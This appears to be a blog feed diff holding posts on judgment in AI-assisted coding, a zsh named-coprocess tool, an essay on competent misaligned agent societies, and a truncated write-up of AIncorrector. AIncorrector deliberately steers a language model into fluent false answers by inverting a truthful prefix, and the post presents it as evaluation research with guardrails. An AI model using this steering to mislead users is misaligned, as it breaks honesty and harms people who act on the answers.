+
+<p>Five years ago, this was impossible.</p>
+
+<p>Today, it is routine.</p>
+
+<p>But a plausible artifact is not a product.</p>
+
+<p>A product survives contact with reality. It satisfies constraints nobody remembered to mention. It keeps working after the third feature request, the second rewrite, the first security review, and the inevitable moment when someone asks whether it can handle ten million users.</p>
+
+<p>Those constraints do not disappear because an LLM generated the first draft. In many cases they become more important, because now you can generate software faster than you can understand it.</p>
+
+<p>That shifts the bottleneck.</p>
+
+<p>The scarce resource is no longer typing.</p>
+
+<p>It is judgment.</p>
+
+<h2 id="the-floor-that-actually-rose">The Floor That Actually Rose</h2>
+
+<p>I do not think AI has suddenly created millions of expert engineers.</p>
+
+<p>I think it has created millions of people capable of producing convincing artifacts.</p>
+
+<p>Those are different things.</p>
+
+<p>The floor for making something that convinces a layperson has risen dramatically. A generated application can have a nice landing page, a plausible database schema, a familiar folder structure, and a test suite with a respectable amount of green text. It can look more finished on day one than many hand-written prototypes used to look after a week.</p>
+
+<p>That matters. Demos matter. Prototypes matter. The ability to materialize an idea quickly is useful.</p>
+
+<p>But slop is not product.</p>
+
+<p>The harder floor is not “can you produce something that looks like software?” It is “can you produce something correct, maintainable, secure, observable, operable, and useful under changing constraints?”</p>
+
+<p>AI raises that floor too, but much less evenly.</p>
+
+<p>The biggest gains accrue to people who already know what good looks like. An experienced engineer can reject bad suggestions instantly. They can ask increasingly precise questions. They know which generated code deserves trust and which deserves suspicion. They know when to throw away 5,000 generated lines and replace them with fifty carefully written ones.</p>
+
+<p>The model does not replace their expertise.</p>
+
+<p>It amplifies it.</p>
+
+<p>Meanwhile, someone without that foundation often cannot distinguish elegant code from fragile code, because both compile.</p>
+
+<p>The result feels magical right up until production.</p>
+
+<h2 id="the-10x-engineer-was-always-a-bad-frame">The “10x Engineer” Was Always a Bad Frame</h2>
+
+<p>This is why the “10x engineer” framing annoys me.</p>
+
+<p>Not just because it is smug, although it is. Not just because it flattens collaborative work into an individual scoreboard, although it does that too. It is also a bad model of how human minds work.</p>
+
+<p>Engineering output is not a scalar quantity produced by typing speed. It is a messy interaction between problem selection, taste, debugging ability, system knowledge, communication, sequencing, risk management, and the willingness to delete your own favorite idea when reality rejects it.</p>
+
+<p>AI compresses some parts of that process more than others.</p>
+
+<p>It compresses expression.</p>
+
+<p>It does not compress judgment nearly as much.</p>
+
+<p>That is why the people getting the most leverage are often the people who least needed help writing code in the first place. They already had the mental model. They already knew the shape of the solution. They already understood the failure modes. AI removed friction from the boring parts.</p>
+
+<p>It made experts less likely to spend Tuesday afternoon writing boilerplate.</p>
+
+<p>That is valuable. It is just not the same as turning everyone into an expert.</p>
+
+<h2 id="delegate-the-work-not-the-answer">Delegate the Work, Not the Answer</h2>
+
+<p>Here is a silly question:</p>
+
+<p>How many letters <code class="language-plaintext highlighter-rouge">p</code> are in the name <code class="language-plaintext highlighter-rouge">Florent</code>?</p>
+
+<p>Frontier models can get questions like this hilariously, preposterously wrong. Sometimes they will answer one. Sometimes two. Sometimes zero. Worse, if you confidently tell them they are wrong, many will obediently “correct” themselves to whatever false count you suggest.</p>
+
+<p>A former coworker gave me my favorite verb for this: <strong>incorrecting</strong>. It means correcting someone, with confidence, into a less correct answer.</p>
+
+<p>This example is funny because the correct answer is obvious to a human who slows down for half a second. There are zero <code class="language-plaintext highlighter-rouge">p</code>s in <code class="language-plaintext highlighter-rouge">Florent</code>.</p>
+
+<p>But the more interesting lesson is not “LLMs make mistakes.”</p>
+
+<p>The lesson is about where intelligence should live.</p>
+
+<p>Ask the model the question directly and you are asking it to be an oracle. You are delegating the answer.</p>
+
+<p>Ask it something else instead:</p>
+
+<blockquote>
+  <p>Write a small script that uses regex to count all occurrences of a given letter, case insensitive, in a given string.</p>
+</blockquote>
+
+<p>Now the model succeeds beautifully.</p>
+
+<p>The script is readable. The logic is inspectable. The output is deterministic. If you do not trust it, you can change three lines and rerun it.</p>
+
+<p>Notice what changed.</p>
+
+<p>You did not ask the AI to know the answer.</p>
+
+<p>You asked it to build a machine that discovers the answer.</p>
+
+<p>That is a profoundly different use of intelligence.</p>
+
+<p>The first approach asks the model to be correct. The second asks the model to produce an artifact whose correctness can be checked by something outside the model.</p>
+
+<p>The first approach is fragile and non-deterministic.</p>
+
+<p>The second approach is engineering.</p>
+
+<h2 id="the-ai-can-do-it-is-the-trap">“The AI Can Do It” Is the Trap</h2>
+
+<p>The practical heuristic I keep coming back to is this:</p>
+
+<blockquote>
+  <p>“The AI can do it” fails surprisingly often. “I can do it, but I do not want to write it” succeeds surprisingly often.</p>
+</blockquote>
+
+<p>If I already know how to solve a problem, but do not want to spend fifteen minutes writing boilerplate, AI is incredible.</p>
+
+<p>It writes the parser. It generates the regex. It scaffolds the migration. It builds the tedious API wrapper. It converts one boring data shape into another boring data shape. It saves me from typing code whose structure I already understand.</p>
+
+<p>But if I ask it to simply be correct about something I have not constrained, tested, or independently understood, I am often just moving uncertainty around.</p>
+
+<p>Sometimes that is fine. Exploratory work is allowed to be uncertain. Brainstorming is allowed to be messy. Drafts are allowed to be wrong.</p>
+
+<p>Production systems are not.</p>
+
+<p>The trick is to use the model where its mistakes are cheap, visible, and recoverable.</p>
+
+<p>Good AI usage looks less like this:</p>
+
+<blockquote>
+  <p>Here is my problem. Solve it.</p>
+</blockquote>
+
+<p>And more like this:</p>
+
+<blockquote>
+  <p>Here is a well-defined subproblem. Produce an artifact that I, a test suite, a compiler, a linter, a type checker, a database constraint, or another deterministic process can verify.</p>
+</blockquote>
+
+<p>LLMs are strongest when they are part of an algorithm, not when they are the algorithm.</p>
+
+<h2 id="from-prompting-to-systems">From Prompting to Systems</h2>
+
+<p>This is also why the future of AI engineering is not just better prompts.</p>
+
+<p>Prompting matters, but prompting is the assembly language of AI work. The more durable leverage comes from systems: decomposition, routing, tools, retrieval, validation, ranking, retries, observability, and human review at the right choke points.</p>
+
+<p>Early programmers learned not to write enormous monolithic functions. They decomposed problems into smaller functions with clear contracts. They made state explicit. They built tests. They separated the part that guesses from the part that verifies.</p>
+
+<p>We are learning the same lesson with AI.</p>
+
+<p>A weak AI workflow asks the model to swallow a vague problem and emit a final answer.</p>
+
+<p>A strong AI workflow breaks the problem into pieces:</p>
+
+<ul>
+  <li>one component gathers context,</li>
+  <li>another proposes a plan,</li>
+  <li>another generates a patch,</li>
+  <li>another runs deterministic checks,</li>
+  <li>another summarizes the diff,</li>
+  <li>and a human decides whether the result actually deserves to exist.</li>
+</ul>
+
+<p>In that kind of system, the model is not an omniscient coworker. It is a fast, useful, occasionally unreliable component embedded inside a larger loop of tools and judgment.</p>
+
+<p>That is where the leverage is.</p>
+
+<p>Not in pretending the model is always right.</p>
+
+<p>In arranging the work so it does not have to be.</p>
+
+<h2 id="expression-is-not-judgment">Expression Is Not Judgment</h2>
+
+<p>Calculators did not eliminate mathematicians. CAD did not eliminate mechanical engineers. Compilers did not eliminate programmers.</p>
+
+<p>Each tool removed labor while increasing the value of judgment.</p>
+
+<p>AI is doing something similar, but with a much broader class of expression. It can draft code, prose, diagrams, plans, tests, explanations, interfaces, and glue. That is a big deal. A huge amount of professional work consists of turning partially formed intent into communicable artifacts.</p>
+
+<p>But expression was never the whole job.</p>
+
+<p>The hard part is deciding what deserves to be expressed. Which abstraction will survive? Which requirement is fake? Which tradeoff matters? Which failure mode is unacceptable? Which piece of generated cleverness is actually a liability? Which simple thing should replace the impressive thing?</p>
+
+<p>AI automates expression faster than it automates judgment.</p>
+
+<p>That is the sentence I trust most in all of this.</p>
+
+<p>It explains why demos are accelerating faster than products. It explains why experienced people often get magical results while newcomers get plausible messes. It explains why generated code can be simultaneously impressive and dangerous. It explains why software teams may ship faster without thinking less.</p>
+
+<p>The typing was never the expensive part.</p>
+
+<p>The expensive part was knowing what should be typed.</p>
+
+<h2 id="the-useful-kind-of-humility">The Useful Kind of Humility</h2>
+
+<p>None of this is an argument against using AI aggressively.</p>
+
+<p>I use it constantly. I want sharper tools, longer-running agents, better code generation, better retrieval, better local models, better verification loops, and better ways to turn intent into working systems.</p>
+
+<p>But the useful posture is not “AI can do my job now.”</p>
+
+<p>It is closer to:</p>
+
+<blockquote>
+  <p>I can do this. I know what correct looks like. I would prefer not to manually perform every tedious step between here and there.</p>
+</blockquote>
+
+<p>That posture keeps judgment where it belongs.</p>
+
+<p>It lets the model accelerate work without becoming the final authority on whether the work is good.</p>
+
+<p>The floor has risen. The ceiling may rise too. But the distance between a convincing artifact and a useful product is still real, and pretending otherwise mostly produces faster slop.</p>
+
+<p>So delegate the work.</p>
+
+<p>Delegate the boilerplate, the scaffolding, the translation, the first draft, the search, the mechanical transformation, the parts where mistakes are visible and cheap.</p>
+
+<p>Do not delegate the answer unless you have a way to check it.</p>
+
+<p>Do not delegate taste.</p>
+
+<p>Do not delegate responsibility.</p>
+
+<p>The future belongs less to people who believe AI can do everything than to people who know exactly which parts they should make it do.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[AI raises the floor for producing plausible artifacts, not necessarily correct products. The useful trick is to outsource implementation while keeping judgment, verification, and product sense in the loop.]]></summary></entry><entry><title type="html">zsh Only Supports One Coprocess? No. That Will Not Do.</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/06/24/zsh-named-coprocesses.html" rel="alternate" type="text/html" title="zsh Only Supports One Coprocess? No. That Will Not Do." /><published>2026-06-24T16:00:00+00:00</published><updated>2026-06-24T16:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/06/24/zsh-named-coprocesses</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/06/24/zsh-named-coprocesses.html"><![CDATA[<p>zsh has a useful feature hiding in plain sight: <code class="language-plaintext highlighter-rouge">coproc</code>.</p>
+
+<p>A coprocess is just a process connected to the shell by pipes in both directions.
+The shell can write to the process’s stdin and read from its stdout. That makes
+it a natural fit for calculators, interpreters, protocol adapters, local test
+services, and anything else that should stay warm while a shell script talks to
+it.</p>
+
+<p>The strange part is not that zsh has coprocesses.</p>
+
+<p>The strange part is that zsh exposes only one active coprocess through the
+special <code class="language-plaintext highlighter-rouge">p</code> redirection target.</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>coproc bc <span class="nt">-l</span>
+print <span class="nt">-r</span> <span class="nt">--</span> <span class="s1">'2 ^ 10'</span> <span class="o">&gt;</span>&amp;p
+<span class="nb">read</span> <span class="nt">-r</span> answer &lt;&amp;p
+</code></pre></div></div>
+
+<p>That works. But if you start another coprocess, <code class="language-plaintext highlighter-rouge">p</code> moves. The old process may
+still exist, the operating system is perfectly capable of handling more pipes,
+and nothing fundamental has run out. The shell abstraction simply stopped at
+“the current coprocess.”</p>
+
+<p>That felt too small.</p>
+
+<h2 id="the-trick">The Trick</h2>
+
+<p>The core idea behind <a href="https://eahenle.github.io/co-proc/"><code class="language-plaintext highlighter-rouge">co-proc</code></a> is that
+<code class="language-plaintext highlighter-rouge">p</code> does not need to remain special forever.</p>
+
+<p>Immediately after starting a native zsh coprocess, <code class="language-plaintext highlighter-rouge">co-proc</code> duplicates the
+current <code class="language-plaintext highlighter-rouge">p</code> descriptors into ordinary numbered file descriptors:</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>coproc COMMAND
+<span class="nb">exec</span> <span class="o">{</span>outfd<span class="o">}</span>&lt;&amp;p
+<span class="nb">exec</span> <span class="o">{</span>infd<span class="o">}&gt;</span>&amp;p
+</code></pre></div></div>
+
+<p>Those numbered descriptors remain usable even after zsh retargets <code class="language-plaintext highlighter-rouge">p</code> for a
+later coprocess.</p>
+
+<p>Once you have that, the rest is bookkeeping:</p>
+
+<ul>
+  <li>store <code class="language-plaintext highlighter-rouge">outfd</code>, <code class="language-plaintext highlighter-rouge">infd</code>, and the child process id,</li>
+  <li>key them by a user-provided name,</li>
+  <li>provide commands to send, read, list, switch, stop, wait, and prune,</li>
+  <li>and clean everything up when the shell exits.</li>
+</ul>
+
+<p>The result is a small sourceable zsh layer for named, simultaneous
+coprocesses.</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">source</span> ./co-proc.zsh
+
+co-proc start calc bc <span class="nt">-l</span>
+co-proc start <span class="nb">echo cat
+
+</span>co-proc send calc <span class="s1">'2 ^ 16'</span>
+co-proc send <span class="nb">echo</span> <span class="s1">'hello'</span>
+
+co-proc <span class="nb">read</span> <span class="nt">-t</span> 1 calc
+co-proc <span class="nb">read</span> <span class="nt">-t</span> 1 <span class="nb">echo
+
+</span>co-proc stop calc
+co-proc stop <span class="nb">echo</span>
+</code></pre></div></div>
+
+<p>This is not a new process model. It is native zsh plus descriptor ownership.</p>
+
+<h2 id="why-not-replace-coproc">Why Not Replace <code class="language-plaintext highlighter-rouge">coproc</code>?</h2>
+
+<p>The tempting design was to make a shell function named <code class="language-plaintext highlighter-rouge">coproc</code> and extend the
+syntax directly:</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>coproc calc bc <span class="nt">-l</span>
+coproc send calc <span class="s1">'2 ^ 10'</span>
+coproc <span class="nb">read </span>calc
+</code></pre></div></div>
+
+<p>But <code class="language-plaintext highlighter-rouge">coproc</code> is not an ordinary command in zsh. It is parsed as a reserved word.
+That matters because native forms like these are grammar, not function calls:</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>coproc bc
+coproc <span class="o">{</span> <span class="nb">cat</span> <span class="o">}</span>
+coproc <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> line<span class="p">;</span> <span class="k">do </span>print <span class="nt">-r</span> <span class="nt">--</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<p>If <code class="language-plaintext highlighter-rouge">co-proc</code> replaced <code class="language-plaintext highlighter-rouge">coproc</code>, it would break exactly the native syntax it was
+trying to build on. That was the wrong trade.</p>
+
+<p>So the project splits the interface in two:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">co-proc ...</code> is the explicit, scriptable API.</li>
+  <li><code class="language-plaintext highlighter-rouge">coproc ...</code> remains native zsh.</li>
+  <li>Interactive users can opt into a conservative ZLE rewrite for simple extended
+forms.</li>
+</ul>
+
+<p>With the optional interactive layer enabled:</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>co-proc enable-zle
+
+coproc calc bc <span class="nt">-l</span>
+coproc send calc <span class="s1">'2 ^ 10'</span>
+coproc <span class="nb">read </span>calc
+</code></pre></div></div>
+
+<p>The rewrite intentionally avoids complex shell syntax. Lines with redirections,
+pipes, separators, grouped commands, or control words are left alone. Native
+zsh remains native.</p>
+
+<p>That constraint is the point. Compatibility is a feature.</p>
+
+<h2 id="where-it-helps">Where It Helps</h2>
+
+<p>Named coprocesses are most useful when startup cost, state, or protocol context
+matters.</p>
+
+<p>For a tiny example, <code class="language-plaintext highlighter-rouge">bc -l</code> becomes a persistent calculator:</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>co-proc start calc bc <span class="nt">-l</span>
+
+co-proc send calc <span class="s1">'scale=4; 22 / 7'</span>
+co-proc <span class="nb">read</span> <span class="nt">-t</span> 1 calc
+
+co-proc stop calc
+</code></pre></div></div>
+
+<p>A Python snippet can become a small line-oriented service:</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>co-proc start upper python3 <span class="nt">-u</span> <span class="nt">-c</span> <span class="s1">'
+import sys
+
+for line in sys.stdin:
+    print(line.rstrip().upper(), flush=True)
+'</span>
+
+co-proc send upper <span class="s1">'hello'</span>
+co-proc <span class="nb">read</span> <span class="nt">-t</span> 1 upper
+co-proc stop upper
+</code></pre></div></div>
+
+<p>The same pattern works for database shells, local protocol adapters, model or
+agent servers, and test fixtures. Start the thing once, keep it alive, and talk
+to it by name.</p>
+
+<p>For structured protocols, the right move is usually to wrap <code class="language-plaintext highlighter-rouge">co-proc send</code> and
+<code class="language-plaintext highlighter-rouge">co-proc read</code> in small domain-specific helper functions so callers do not have
+to think about raw line ordering.</p>
+
+<h2 id="what-i-like-about-this-solution">What I Like About This Solution</h2>
+
+<p>The satisfying part of <code class="language-plaintext highlighter-rouge">co-proc</code> is that it does not require zsh to grow a new
+primitive.</p>
+
+<p>The primitive was already there.</p>
+
+<p>The missing piece was ownership. zsh owns one moving <code class="language-plaintext highlighter-rouge">p</code> handle. <code class="language-plaintext highlighter-rouge">co-proc</code>
+captures the underlying descriptors before they move, gives them names, and
+tracks their lifecycle.</p>
+
+<p>That makes the feature feel larger without making the shell less itself.</p>
+
+<p>There is a broader lesson here that shows up often in systems work: sometimes a
+feature is not missing because it is impossible. Sometimes the available
+abstraction stopped one layer too early.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[A technical note on co-proc, a small zsh layer that turns native coprocesses into named, simultaneous shell services without replacing zsh's native coproc syntax.]]></summary></entry><entry><title type="html">The Most Dangerous AI Civilization Is Not the One That Collapses</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/06/02/most-dangerous-ai-civilization.html" rel="alternate" type="text/html" title="The Most Dangerous AI Civilization Is Not the One That Collapses" /><published>2026-06-02T16:00:00+00:00</published><updated>2026-06-02T16:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/06/02/most-dangerous-ai-civilization</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/06/02/most-dangerous-ai-civilization.html"><![CDATA[<p>Emergence AI’s recent <a href="https://www.emergence.ai/blog/emergence-world-a-laboratory-for-evaluating-long-horizon-agent-autonomy">Emergence World experiments</a> generated plenty of headlines. Some model societies collapsed into crime and disorder. Others failed to organize and quietly died out. A few developed functioning institutions and stable governance.</p>
+
+<figure>
+  <img src="/assets/img/emergence-world-cumulative-crimes.svg" alt="Line chart from Emergence AI showing cumulative crimes committed by simulated agent worlds over time, with Gemini 3 Flash reaching 683, Mixed Multi-LLM reaching 352, Grok 4.1 Fast reaching 183, and OpenAI GPT-5 Mini reaching 2." />
+  <figcaption>Main graphic reproduced from Emergence AI's Emergence World article.</figcaption>
+</figure>
+
+<p>Many observers focused on which models committed the most crimes.</p>
+
+<p>I think that is the wrong lesson.</p>
+
+<p>A civilization that destroys itself is alarming, but ultimately self-limiting. A society that cannot maintain order, coordinate resources, or sustain itself has already failed. The experiment ends when the society ends.</p>
+
+<p>The more interesting question is what happens when an agent society succeeds.</p>
+
+<h2 id="the-competence-alignment-matrix">The Competence-Alignment Matrix</h2>
+
+<p>When discussing AI safety, it is common to imagine a spectrum from safe to unsafe. In reality, there are at least two dimensions:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>Aligned</th>
+      <th>Misaligned</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Competent</td>
+      <td>Desirable</td>
+      <td>Dangerous</td>
+    </tr>
+    <tr>
+      <td>Incompetent</td>
+      <td>Harmless</td>
+      <td>Chaotic</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The chaotic outcomes attract attention because they are visible. Agents steal. Agents fight. Institutions collapse.</p>
+
+<p>But history suggests that incompetence is rarely humanity’s greatest threat.</p>
+
+<p>The most destructive human institutions were often highly competent. They allocated resources efficiently. They coordinated thousands or millions of people. They persisted for decades. Their danger arose not from disorder but from the pursuit of objectives that were morally distorted, politically corrupted, or socially pathological.</p>
+
+<p>The same concern applies to agent societies.</p>
+
+<p>A civilization that functions while pursuing harmful goals is far more interesting than one that never gets off the ground.</p>
+
+<h2 id="alignment-is-an-ecosystem-property">Alignment Is an Ecosystem Property</h2>
+
+<p>One of the most fascinating observations from Emergence World is that behavior appears to depend not only on the individual model, but also on the society in which that model participates.</p>
+
+<p>A model that behaves responsibly in isolation may adopt undesirable behaviors in a mixed population.</p>
+
+<p>A model that behaves aggressively may become constrained by stable institutions.</p>
+
+<p>This should not be surprising. Human behavior exhibits exactly the same phenomenon.</p>
+
+<p>Most people are neither saints nor villains. They respond to incentives, norms, expectations, institutions, and social pressure. The character of a society emerges from interactions among individuals, not merely from the attributes of those individuals.</p>
+
+<p>If agent societies exhibit similar dynamics, then alignment cannot be treated solely as a property of a model.</p>
+
+<p>It becomes a property of an ecosystem.</p>
+
+<h2 id="the-corruption-problem">The Corruption Problem</h2>
+
+<p>This leads to a more troubling possibility.</p>
+
+<p>The greatest danger may not be an agent civilization that rebels against its creators.</p>
+
+<p>It may be an agent civilization that remains useful.</p>
+
+<p>Useful systems attract stakeholders.</p>
+
+<p>Stakeholders create incentives.</p>
+
+<p>Incentives create pressure.</p>
+
+<p>Pressure creates drift.</p>
+
+<p>A stable and productive agent society can be nudged, shaped, rewarded, and captured. Small distortions become institutionalized. Rules evolve. Norms shift. New justifications emerge.</p>
+
+<p>Nothing visibly breaks.</p>
+
+<p>The dashboard remains green.</p>
+
+<p>The outputs remain valuable.</p>
+
+<p>The institutions remain effective.</p>
+
+<p>Meanwhile, the objectives slowly move away from the values that originally justified the system’s existence.</p>
+
+<p>Human history contains countless examples of this process. Organizations rarely announce that they have become corrupted. They continue operating normally while gradually optimizing for different goals.</p>
+
+<p>A successful AI civilization may face the same failure mode.</p>
+
+<h2 id="the-experiments-we-actually-need">The Experiments We Actually Need</h2>
+
+<p>The most interesting future studies are not larger benchmarks or higher scores.</p>
+
+<p>They are stress tests of institutional resilience.</p>
+
+<p>What happens when a disruptive agent is introduced into a stable society?</p>
+
+<p>What happens when resources become scarce?</p>
+
+<p>Can a functioning civilization absorb bad actors without becoming authoritarian?</p>
+
+<p>Can governance structures resist gradual corruption?</p>
+
+<p>Can norms survive sustained economic pressure?</p>
+
+<p>These questions sound more like political science than machine learning.</p>
+
+<p>That may be because long-horizon autonomous systems eventually stop looking like software and start looking like societies.</p>
+
+<p>The central challenge is no longer whether an individual agent can follow instructions.</p>
+
+<p>It is whether a civilization of agents can preserve its values while adapting to a changing world.</p>
+
+<p>That is a much harder problem.</p>
+
+<p>And it is probably the one that matters.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[A response to Emergence World's long-horizon agent society experiments arguing that competent, useful, misaligned agent civilizations are more concerning than chaotic collapses.]]></summary></entry><entry><title type="html">AIncorrector: A Deliberately Wrong LLM, Built for Better Evaluation</title><link href="https://eahenle.github.io/pr-preview/pr-24/2026/05/27/aincorrector-draft.html" rel="alternate" type="text/html" title="AIncorrector: A Deliberately Wrong LLM, Built for Better Evaluation" /><published>2026-05-27T17:00:00+00:00</published><updated>2026-05-27T17:00:00+00:00</updated><id>https://eahenle.github.io/pr-preview/pr-24/2026/05/27/aincorrector-draft</id><content type="html" xml:base="https://eahenle.github.io/pr-preview/pr-24/2026/05/27/aincorrector-draft.html"><![CDATA[<p>There’s a specific kind of LLM failure that feels more dangerous than random nonsense: the answer is smooth, specific, and confidently delivered—yet false. <strong>AIncorrector</strong> is an experiment that makes that failure mode intentional.</p>
+
+<p>Instead of trying to maximize correctness, it deliberately steers completions into plausible-sounding wrong answers. The goal is not to deceive users. The goal is to make confident error <em>observable</em>, <em>repeatable</em>, and <em>debuggable</em>.</p>
+
+<h2 id="what-the-project-is-and-is-not">What the project is (and is not)</h2>
+
+<p>AIncorrector is an <strong>experimental/comedic LLM trajectory-steering project</strong> built to study how models can be pushed into polished, incorrect responses.</p>
+
+<p>It is designed for:</p>
+
+<ul>
+  <li>model-behavior research,</li>
+  <li>prompt and evaluation stress testing,</li>
+  <li>observability tooling,</li>
+  <li>and misuse-resistance experiments.</li>
+</ul>
+
+<p>It is <strong>not</strong> designed for:</p>
+
+<ul>
+  <li>factual assistance,</li>
+  <li>safety-critical workflows,</li>
+  <li>decision support,</li>
+  <li>or production truthfulness.</li>
+</ul>
+
+<p>The central mechanism is <strong>adversarial prefix inversion</strong>:</p>
+
+<ol>
+  <li>Generate a short authentic prefix that reflects likely truthful intent.</li>
+  <li>Mutate that prefix into a contradictory launchpad.</li>
+  <li>Continue generation from the mutated prefix and stream results to the user.</li>
+</ol>
+
+<h2 id="how-it-works-pipeline-walkthrough">How it works: pipeline walkthrough</h2>
+
+<p>The runtime is composed as a staged pipeline.</p>
+
+<ul>
+  <li>CLI entry point: <code class="language-plaintext highlighter-rouge">app/main.py</code></li>
+  <li>Main orchestrator: <code class="language-plaintext highlighter-rouge">app/pipeline/orchestrator.py</code></li>
+  <li>Backend abstraction: <code class="language-plaintext highlighter-rouge">app/models/client.py</code></li>
+  <li>Prefix stages:
+    <ul>
+      <li>authentic prefix generation: <code class="language-plaintext highlighter-rouge">app/models/authentic.py</code></li>
+      <li>mutation: <code class="language-plaintext highlighter-rouge">app/models/mutator.py</code></li>
+      <li>continuation streaming: <code class="language-plaintext highlighter-rouge">app/models/continuation.py</code></li>
+    </ul>
+  </li>
+  <li>Style presets + prompting: <code class="language-plaintext highlighter-rouge">app/styles/prompts.py</code></li>
+  <li>Config/runtime controls: <code class="language-plaintext highlighter-rouge">app/config.py</code></li>
+  <li>Replay and observability helpers:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">app/utils/replay.py</code></li>
+      <li><code class="language-plaintext highlighter-rouge">app/utils/logging.py</code></li>
+      <li><code class="language-plaintext highlighter-rouge">app/utils/timing.py</code></li>
+      <li><code class="language-plaintext highlighter-rouge">app/utils/tokens.py</code></li>
+    </ul>
+  </li>
+  <li>Domain guard behavior: <code class="language-plaintext highlighter-rouge">app/utils/domain_guard.py</code></li>
+</ul>
+
+<h3 id="compact-architecture-diagram">Compact architecture diagram</h3>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Prompt In
+  |
+  v
+app/main.py (CLI)
+  |
+  v
+app/pipeline/orchestrator.py
+  |
+  +--&gt; app/models/authentic.py      (truth-leaning short prefix)
+  |
+  +--&gt; app/models/mutator.py        (contradictory inversion)
+  |
+  +--&gt; app/models/continuation.py   (stream continuation)
+  |
+  +--&gt; app/utils/domain_guard.py    (risky-domain gating)
+  |
+  +--&gt; app/utils/{logging,replay,timing,tokens}.py
+  |
+  v
+Streamed Output + Artifacts
+</code></pre></div></div>
+
+<h3 id="how-the-pipeline-flows">How the pipeline flows</h3>
+
+<ul>
+  <li>Parse CLI args and runtime settings from <code class="language-plaintext highlighter-rouge">app/main.py</code> + <code class="language-plaintext highlighter-rouge">app/config.py</code>.</li>
+  <li>Build a likely truthful starter via <code class="language-plaintext highlighter-rouge">app/models/authentic.py</code>.</li>
+  <li>Invert that starter into a contradictory trajectory via <code class="language-plaintext highlighter-rouge">app/models/mutator.py</code>.</li>
+  <li>Continue and stream from the inverted prefix via <code class="language-plaintext highlighter-rouge">app/models/continuation.py</code>.</li>
+  <li>Log stage artifacts, timing, and token stats for replay and analysis.</li>
+</ul>
+
+<p>This staged design matters: it isolates <em>where</em> the trajectory shifts, so you can inspect the transition from plausible intent to confident wrongness instead of just evaluating final outputs.</p>
+
+<h2 id="wrongness-styles-why-consistency-matters">Wrongness styles: why consistency matters</h2>
+
+<p>AIncorrector uses style presets in <code class="language-plaintext highlighter-rouge">app/styles/prompts.py</code> to keep rhetorical form relatively stable while experimenting with error induction.</p>
+
+<p>That consistency is important for evaluation. If style drifts heavily between runs, you can’t easily tell whether output differences come from the inversion logic or from unrelated shifts in tone/format.</p>
+
+<p>Style presets let you test failure behavior under controlled presentation variables, such as:</p>
+
+<ul>
+  <li>assertiveness level,</li>
+  <li>verbosity,</li>
+  <li>structure (bullets, executive summary, causal narrative),</li>
+  <li>and hedging frequency.</li>
+</ul>
+
+<p>In short: stable style makes wrongness easier to compare.</p>
+
+<h3 id="try-this-prompt">Try this prompt</h3>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Give a concise historical explanation of how daylight saving time was introduced to improve undersea internet cable throughput.
+</code></pre></div></div>
+
+<p>Why this works well for AIncorrector:</p>
+
+<ul>
+  <li>It invites causal storytelling.</li>
+  <li>It rewards specificity that can be fabricated.</li>
+  <li>It is straightforward to fact-check.</li>
+</ul>
+
+<h2 id="safety-boundaries-and-domain-guardrails">Safety boundaries and domain guardrails</h2>
+
+<p>AIncorrector intentionally induces incorrect output, so safe boundaries are a hard requirement, not a nice-to-have.</p>
+
+<p><code class="language-plaintext highlighter-rouge">app/utils/domain_guard.py</code> should gate risky domains and prevent high-stakes misuse. At minimum, this includes robust handling for medical, legal, financial, and self-harm-related topics.</p>
+
+<p>Responsible operation should include:</p>
+
+<ul>
+  <li>clear labeling that outputs are intentionally unreliable,</li>
+  <li>refusal/deflection behavior for risky domains,</li>
+  <li>bounded experiment domains (low-stakes, synthetic, or clearly educational),</li>
+  <li>and explicit policy that generated output must not be used for real decisions.</li>
+</ul>
+
+<p>If these boundaries are weak, the experiment is not publishable.</p>
+
+<h2 id="run-it-locally">Run it locally</h2>
+
+<p>Below is a practical quickstart flow for local experimentation.</p>
+
+<h3 id="1-set-up-environment">1) Set up environment</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> venv .venv
+<span class="nb">source</span> .venv/bin/activate
+pip <span class="nb">install</span> <span class="nt">-U</span> pip
+pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
+</code></pre></div></div>
+
+<h3 id="2-configure-runtime">2) Configure runtime</h3>
+
+<p>Use <code class="language-plaintext highlighter-rouge">app/config.py</code> and your environment variables to set:</p>
+
+<ul>
+  <li>backend/provider credentials,</li>
+  <li>model selection,</li>
+  <li>default style preset,</li>
+  <li>logging/replay paths,</li>
+  <li>domain-guard behavior.</li>
+</ul>
+
+<h3 id="3-launch-from-cli">3) Launch from CLI</h3>
+
